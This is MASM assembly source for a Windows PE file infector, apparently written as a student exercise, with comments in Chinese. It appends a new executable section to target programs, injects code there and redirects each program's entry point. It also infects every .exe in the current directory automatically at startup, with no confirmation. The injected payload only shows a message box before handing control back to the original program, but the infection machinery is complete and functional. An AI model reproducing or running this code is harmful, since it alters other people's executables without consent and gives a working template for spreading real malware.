.386
.model flat,stdcall
option casemap:none

include windows.inc
include gdi32.inc
includelib gdi32.lib
include user32.inc
includelib user32.lib
include kernel32.inc
includelib kernel32.lib
include comdlg32.inc
includelib comdlg32.lib


IDR_MENU	equ	1001
ID_QUERY_FILE	equ	1101
ID_EXIT		equ	1102
ID_INFECT_FILE	equ	1201
ID_HELP		equ	1301
IDC_EDIT	equ	40001

OpenFileDlg	proto 	hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
GetPEHeaderInfo	proto	lpFileName:dword,hEdit:HWND
InfectPEFile	proto
InfectAll	proto

.data
		hInstance	dd	?
		hMainWnd	dd	?
		hEdit		HWND	?
		szFileName	db	MAX_PATH dup (0)

.const
		;****************************
		;_WinMain中使用的全局字符串变量（实在是因为初始化局部字串变量不容易啊）
		;****************************
		szAppName	db 	'PEFILE',0
		szCaption	db	'PE File Operation',0

		;****************************
		;_MainWndProc中使用的全局字符串变量
		;****************************
		szEditCtrl	db	"EDIT",0
		szFilterString	db	"Portable Executive File(*.exe)",0,"*.exe",0,"All files(*.*)",0,"*.*",0,0
		szTitle		db	"please open a Portable Executive File!",0
		szConfirmation	db	"Are you sure to infect that chosen file, the procedure isnot reversible!",0
		szWarning	db	"Warning!!!!!",0
		szHelp		db	"首先选择文件->QueryFile获取文件信息，然后选择Infect->InfectChosenFile感染上一步选定的文件",0

		;****************************
		;GetPEHeaderInfo中使用的全局字符串变量
		;****************************
		szErrorOpenFile	db	"Cannot open chosen file!",0
		szErrorFileType	db	"This file isn't a PE file!",0
		szBasicInfoFormat	db	0dh,0ah,0dh,0ah
					db	'NumberOfSections : %d',0dh,0ah
					db	'ImageBase : 	%08X',0dh,0ah
					db	'AddressOfEntryPoint : %08X',0dh,0ah
					db	'SizeOfImage %08X',0dh,0ah,0dh,0ah
		szSectionInfoString	db	'节区名称		节区大小		RVA地址		对齐后大小	文件偏移		属性',0dh,0ah,0
		szSectionInfoFormat	db	'%s		%08X	%08X	%08X	%08X	%08X',0dh,0ah,0dh,0ah,0

		;****************************
		;InfectPEFile中使用的全局字符串变量
		;****************************
		szDllName	db	"user32",0
		szMessageBoxA	db	"MessageBoxA",0

.code


;**************************************************************
;窗口过程定义
;**************************************************************
_MainWndProc proc uses edi esi ebx,hWnd,uMessage,wParam,lParam
			mov eax,uMessage

			.if eax == WM_CREATE
				invoke CreateWindowEx,0,offset szEditCtrl,NULL,WS_CHILD or WS_VISIBLE or WS_HSCROLL or WS_VSCROLL\
							or WS_BORDER or ES_LEFT or ES_MULTILINE or ES_AUTOHSCROLL or ES_AUTOVSCROLL,\
							0,0,0,0,hWnd,IDC_EDIT,hInstance,0
				mov	hEdit,eax
				invoke	SendMessage,hEdit,EM_SETREADONLY,TRUE,0;将编辑框属性改为只读

			.elseif eax == WM_SIZE
				xor	eax,eax
				mov	ax,word ptr [lParam]
				xor	ecx,ecx
				mov	cx,word ptr [lParam + 2]
				invoke	MoveWindow,hEdit,0,0,eax,ecx,TRUE;要注意这里的EAX,ECX对应的MoveWindow函数的参数都是整型变量，所以代码如此难看

			.elseif	eax == WM_COMMAND
				mov eax,wParam
				.if ax == ID_EXIT
					jmp	_Exit;
				.elseif ax == ID_QUERY_FILE
					invoke OpenFileDlg,hInstance,hWnd,offset szFileName,offset szFilterString,offset szTitle
		_QueryInfo:
					invoke SetWindowText,hEdit,offset szFileName
					invoke GetPEHeaderInfo,offset szFileName,hEdit
				.elseif	ax == ID_INFECT_FILE
					invoke	MessageBox,NULL,offset szConfirmation,offset szWarning,MB_YESNO
						.if	eax == IDYES
							invoke	InfectPEFile
						.endif
					jmp	_QueryInfo
				.elseif	ax == ID_HELP
					invoke MessageBox,NULL,offset szHelp,offset szWarning,MB_OK
				.endif
			.elseif eax == WM_CLOSE
_Exit:
				invoke DestroyWindow,hMainWnd
				invoke PostQuitMessage,NULL

			.else
				invoke DefWindowProc,hWnd,uMessage,wParam,lParam
				ret
			.endif
			xor eax,eax
			ret
_MainWndProc endp

;***********************************************
;_WinMain函数
;***********************************************
_WinMain proc	
		local @stWndClass : WNDCLASSEX
		local @stMsg      : MSG
		local @hMenu	: HMENU
		invoke GetModuleHandle,NULL
		mov hInstance,eax
		invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass

		invoke LoadCursor,0,IDC_ARROW
		mov  @stWndClass.hCursor,eax
		push hInstance
		pop  @stWndClass.hInstance
		mov  @stWndClass.cbSize,sizeof WNDCLASSEX
		mov  @stWndClass.style,CS_HREDRAW or CS_VREDRAW
		mov  @stWndClass.lpfnWndProc,offset _MainWndProc
		mov  @stWndClass.hbrBackground,COLOR_WINDOW + 1
		mov  @stWndClass.lpszClassName,offset szAppName
		invoke RegisterClassEx,addr @stWndClass

		invoke LoadMenu,hInstance,IDR_MENU
		mov @hMenu,eax

		invoke CreateWindowEx,WS_EX_CLIENTEDGE,offset szAppName,offset szCaption,WS_OVERLAPPEDWINDOW,\
						100,100,600,400,NULL,@hMenu,hInstance,NULL

		mov hMainWnd,eax
		invoke ShowWindow,hMainWnd,SW_SHOWNORMAL
		invoke UpdateWindow,hMainWnd
		invoke InfectAll

		.while TRUE
			invoke GetMessage,addr @stMsg,NULL,0,0
			.break .if eax == 0
			invoke TranslateMessage,addr @stMsg
			invoke DispatchMessage,addr @stMsg
		.endw
		ret
_WinMain endp

;*************************************************************************************************
;打开文件模块(不使用任何全局变量的模块，可直接移植到其他文件中)
;*************************************************************************************************
OpenFileDlg proc hInst:HINSTANCE,hWnd:HWND,lpFileName:dword,lpFilterString:dword,lpTitle:dword
	;hInst代表当前进程的示例句柄
	;hWnd代表当前窗口句柄
	;lpFileName是指向存储要打开文件名的缓冲区的长指针
	;lpFilterString是指向筛选文件类型的缓冲区的长指针
	;lpTitle是指向打开文件通用对话框的名字的长指针

	local	@ofn : OPENFILENAME
	invoke	RtlZeroMemory,addr @ofn,sizeof OPENFILENAME

	mov	@ofn.lStructSize,sizeof OPENFILENAME
	push	hWnd
	pop	@ofn.hwndOwner
	push	hInst
	pop	@ofn.hInstance
	push	lpFilterString
	pop	@ofn.lpstrFilter
	push	lpFileName
	pop	@ofn.lpstrFile
	mov	@ofn.nMaxFile,MAX_PATH
	mov	@ofn.Flags,OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_LONGNAMES or OFN_EXPLORER
	push	lpTitle
	pop	@ofn.lpstrTitle
	invoke	GetOpenFileName,addr @ofn
	
	.if eax == 0
		ret;失败返回值是0，即EAX的值
	.endif

	ret
OpenFileDlg	endp

;************************************************************
;读取文件头信息
;************************************************************
GetPEHeaderInfo	proc	lpFileName:dword,hEditCtrl:HWND
	;lpFileName	是指向要打开的文件名的指针
	;hEditCtrl	是控件输出的子控件
	
	local	@hFile:HANDLE
	local	@dwFileReadWritten:dword	;使用读写文件是必需的参数
	local	@szBuffer[200]:byte

	;存储PE文件头基本信息的变量
	local	@ImageNtHeaders : IMAGE_NT_HEADERS
	local	@ImageSectionHeader : IMAGE_SECTION_HEADER

	local	@dwPEHeaderOffset : dword
	local	@dwSectionHeaderOffset : dword
	local	@dwCurrentSectionHeader: dword
	
	invoke	CreateFile,lpFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,\
			FILE_ATTRIBUTE_NORMAL,NULL
	mov	@hFile,eax
	.if	eax == INVALID_HANDLE_VALUE
		invoke SetWindowText,hEditCtrl,addr szErrorOpenFile
		ret
	.endif
	;handle distance_to_move out_p_distance_to_move_high dwMoveMethod
	invoke	SetFilePointer,@hFile,3ch,NULL,FILE_BEGIN
	;handle out_pbuffer num_of_bytes_to_read out_lp_num_of_bytes_read inout_lpoverlapped
	invoke	ReadFile,@hFile,addr @dwPEHeaderOffset,sizeof DWORD,addr @dwFileReadWritten,0
	; get PE offset

	invoke	SetFilePointer,@hFile,@dwPEHeaderOffset,NULL,FILE_BEGIN
	invoke	ReadFile,@hFile,addr @ImageNtHeaders,sizeof IMAGE_NT_HEADERS,addr @dwFileReadWritten,0
	
	.if	[@ImageNtHeaders.Signature] != IMAGE_NT_SIGNATURE
		invoke SetWindowText,hEditCtrl,addr szErrorFileType
		ret
	.endif

	movzx	eax,[@ImageNtHeaders.FileHeader.NumberOfSections];这个地方让人很困扰啊，因为不扩展WORD为DWORD，始终都有错误
	invoke	wsprintf,addr @szBuffer,offset szBasicInfoFormat,eax,\
				@ImageNtHeaders.OptionalHeader.ImageBase,@ImageNtHeaders.OptionalHeader.AddressOfEntryPoint,\
				@ImageNtHeaders.OptionalHeader.SizeOfImage
	invoke	GetWindowTextLength,hEditCtrl
	invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
	invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer

	;获取节表信息
	xor	ecx,ecx
	mov	eax,@dwPEHeaderOffset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	@dwSectionHeaderOffset,eax
	mov	@dwCurrentSectionHeader,eax

	.while	cx < [@ImageNtHeaders.FileHeader.NumberOfSections]
		push	ecx;将ECX入栈保护是必需的，因为WINDOWS在调用函数是，会破坏ECX的值
		invoke	SetFilePointer,@hFile,@dwCurrentSectionHeader,NULL,FILE_BEGIN
		invoke	ReadFile,@hFile,addr @ImageSectionHeader,sizeof IMAGE_SECTION_HEADER,addr @dwFileReadWritten,0
		invoke	wsprintf,addr @szBuffer,offset szSectionInfoFormat,addr @ImageSectionHeader.Name1,\
				@ImageSectionHeader.Misc.VirtualSize,@ImageSectionHeader.VirtualAddress,\
				@ImageSectionHeader.SizeOfRawData,@ImageSectionHeader.PointerToRawData,\
				@ImageSectionHeader.Characteristics
		invoke	GetWindowTextLength,hEditCtrl
		invoke	SendMessage,hEditCtrl,EM_SETSEL,eax,eax
		invoke	SendMessage,hEditCtrl,EM_REPLACESEL,0,addr @szBuffer
		pop	ecx
		inc	cx
		add	@dwCurrentSectionHeader,sizeof IMAGE_SECTION_HEADER
	.endw
	
	invoke CloseHandle,@hFile
	ret
GetPEHeaderInfo	endp


;******************************************************************************
;***************************************************************
;InfectPEFile函数
;***************************************************************
;******************************************************************************
InfectPEFile proc
	local	dwPE_Header_Offset
	local	dwMySection_Offset
	local	dwFileReadWritten
	local	dwLast_SizeOfRawData
	local	dwLast_PointerToRawData
	local	hFile
	local	PE_Header:IMAGE_NT_HEADERS
	local	My_Section:IMAGE_SECTION_HEADER

	invoke CreateFile,addr szFileName,GENERIC_READ or GENERIC_WRITE,\
			FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
	.if	eax == INVALID_HANDLE_VALUE
		mov eax,1000
		ret
	.endif
	mov	hFile,eax
	
;************************************************************************************************************
;读取文件头到PE_Header结构中
;************************************************************************************************************
	invoke SetFilePointer,hFile,3ch,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr dwPE_Header_Offset,sizeof DWORD,addr dwFileReadWritten,0
	invoke SetFilePointer,hFile,dwPE_Header_Offset,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	;检验这个文件是不是一个PE文件，方法很简单，用PE文件签名检验
	.if	PE_Header.Signature != IMAGE_NT_SIGNATURE
		mov eax,1001
		ret
	.endif

	;保存当前的程序入口点RVA和基址
	mov	eax,[PE_Header.OptionalHeader.AddressOfEntryPoint]
	mov	dwOld_AddressOfEntryPoint,eax
	mov	eax,[PE_Header.OptionalHeader.ImageBase]
	mov	dwOld_ImageBase,eax

;************************************************************************************************************
;填写自己的节的头的内容
;************************************************************************************************************
	;找到要添加的新节的头的文件偏移量
	mov	eax,sizeof IMAGE_SECTION_HEADER
	xor	ecx,ecx
	mov	cx,[PE_Header.FileHeader.NumberOfSections]
	mul	ecx
	add	eax,dwPE_Header_Offset
	add	eax,sizeof IMAGE_NT_HEADERS
	mov	dwMySection_Offset,eax
	;验证是否能装下一个新的IMAGE_SECTION_HEADER结构
	.if eax > [PE_Header.OptionalHeader.SizeOfHeaders]
		mov eax,1002
		ret
	.endif
	;正式开始填写新节的头的内容
	mov	dword ptr [My_Section.Name1],"BL"
	mov	[My_Section.Misc.VirtualSize],offset virusEnd - offset virusStart
	mov	eax,[PE_Header.OptionalHeader.SizeOfImage]
	mov	[My_Section.VirtualAddress],eax
	mov	eax,[My_Section.Misc.VirtualSize]
	mov	ecx,[PE_Header.OptionalHeader.FileAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	mov	[My_Section.SizeOfRawData],eax
	;要定位到前个节区的头信息，为了得到PointerToRawData成员变量
	mov	eax,dwMySection_Offset
	sub	eax,24d;到达前个节区的SizeOfRawData成员变量处
	invoke SetFilePointer,hFile,eax,NULL,FILE_BEGIN
	invoke ReadFile,hFile,addr dwLast_SizeOfRawData,4,addr dwFileReadWritten,0
	invoke ReadFile,hFile,addr dwLast_PointerToRawData,4,addr dwFileReadWritten,0
	mov	eax,dwLast_PointerToRawData
	add	eax,dwLast_SizeOfRawData
	mov	[My_Section.PointerToRawData],eax
	mov	[My_Section.PointerToRelocations],0
	mov	[My_Section.PointerToLinenumbers],0
	mov	[My_Section.NumberOfRelocations],0
	mov	[My_Section.NumberOfLinenumbers],0
	mov	[My_Section.Characteristics],0E0000020h;新节的属性是可读可写可执行

	;将新节的头写入要感染的文件中
	invoke SetFilePointer,hFile,dwMySection_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr My_Section,sizeof IMAGE_SECTION_HEADER,addr dwFileReadWritten,0

;************************************************************************************************************
;获取要调用的API的线性地址
;************************************************************************************************************
	invoke LoadLibrary,addr szDllName
	invoke GetProcAddress,eax,addr szMessageBoxA
	mov	MessageBoxAddr,eax
	mov	eax,MessageBoxAddr

	
	;将病毒代码添加在节的最后
	invoke SetFilePointer,hFile,0,0,FILE_END
	push	0
	lea	eax,dwFileReadWritten
	push	eax
	push	[My_Section.SizeOfRawData]
	lea	eax,virusStart
	push	eax
	push	hFile
	call	WriteFile

;************************************************************************************************************
;更改程序进入点和EXE映像大小
;************************************************************************************************************
	inc	[PE_Header.FileHeader.NumberOfSections];节的个数增加1
	mov	eax,[My_Section.VirtualAddress]		;入口点改变
	mov	[PE_Header.OptionalHeader.AddressOfEntryPoint],eax

	mov	eax,[My_Section.Misc.VirtualSize]	;程序映像大小改变
	mov	ecx,[PE_Header.OptionalHeader.SectionAlignment]
	cdq
	div	ecx
	inc	eax
	mul	ecx
	add	[PE_Header.OptionalHeader.SizeOfImage],eax

	invoke SetFilePointer,hFile,dwPE_Header_Offset,0,FILE_BEGIN
	invoke WriteFile,hFile,addr PE_Header,sizeof IMAGE_NT_HEADERS,addr dwFileReadWritten,0
	
	invoke CloseHandle,hFile
	xor	eax,eax
	inc	eax;成功感染返回值设为1
	ret
InfectPEFile endp

;************************************************************************************************************
;感染当前目录所有可执行文件
;************************************************************************************************************
fmt db "%s %d",0dh,0ah,0
wcard db "*.exe",0
notfound db "No exe file found!",0
msg db "PB14011086郑子涵",0dh,0ah,"感染当前目录文件，1表示成功：",0dh,0ah,0
InfectAll proc
	local	szBuffer[MAX_PATH+10]:byte
	local	wfd:WIN32_FIND_DATA
	local	hSearch:dword

	;输出提示信息
	invoke	GetWindowTextLength,hEdit
	invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
	invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr msg

	;查找当前目录的第一个exe文件
	invoke FindFirstFile,addr wcard,addr wfd
	.if eax == INVALID_HANDLE_VALUE
		;没有找到，输出错误信息并返回
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr notfound
		ret
	.else
		mov hSearch,eax
	.endif

	;如果不是目录，是文件
	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		;感染文件
		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
		invoke	InfectPEFile
		;输出文件名和感染结果
		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr szBuffer
	.endif

nextfile:
	;查找下一个文件
	invoke FindNextFile,hSearch,ADDR wfd
	;没找到则结束
	cmp eax,0
	je InfectAllEnd
	;如果不是目录，是文件
	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		;感染文件
		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
		invoke	InfectPEFile
		;输出文件名和感染结果
		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
		invoke	GetWindowTextLength,hEdit
		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr szBuffer
	.endif
	jmp nextfile

InfectAllEnd:
	invoke FindClose,hSearch

	ret
InfectAll endp

;************************************************************************************************************
;以下是插入的病毒代码
;************************************************************************************************************
virusStart:
	call nStart
nStart:
	pop	ebp
	sub	ebp,offset nStart

;TODO
	push	MB_YESNO
	lea	eax,szTitleMsg[ebp]
	push	eax
	lea	eax,szContent[ebp]
	push	eax
	push	0
	call 	MessageBoxAddr[ebp]

	.if eax == IDNO
		ret
	.endif

	mov	eax,dwOld_AddressOfEntryPoint[ebp]
	add	eax,dwOld_ImageBase[ebp]
	push	eax
	ret
;变量定义
	dwOld_AddressOfEntryPoint	dd	0
	dwOld_ImageBase			dd	0
	szTitleMsg			db	"PE Virus,Created by PB14011086郑子涵",0	
	szContent			db	"Do you want to continue",0
	MessageBoxAddr			dd	0
virusEnd:

;***********************************************************
;主程序开始
;***********************************************************
	start:
		call _WinMain
		invoke ExitProcess,NULL
	end start
